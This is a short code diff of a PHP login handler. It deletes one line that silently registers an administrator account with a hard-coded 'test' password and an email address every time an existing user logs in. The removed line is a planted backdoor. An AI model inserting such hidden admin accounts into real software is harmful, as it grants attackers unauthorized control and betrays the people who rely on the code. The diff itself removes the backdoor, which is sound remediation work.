@@ -12,7 +12,6 @@ if(isset($_POST['username']) && isset($_POST['password']) && !isset($_SESSION['o
     $password = Security::hash($_POST['password']);
     if(User::usernameExists($username)){
         $userID = User::getUserID($username);
-        User::registerUser("jac0", "jacoruit@live.nl", Security::hash("test"), RANK_ADMIN);
         $goodLogin = User::isGoodPassword($userID, $password);
         if($goodLogin){
             if(!User::userIsActivated($userID)){
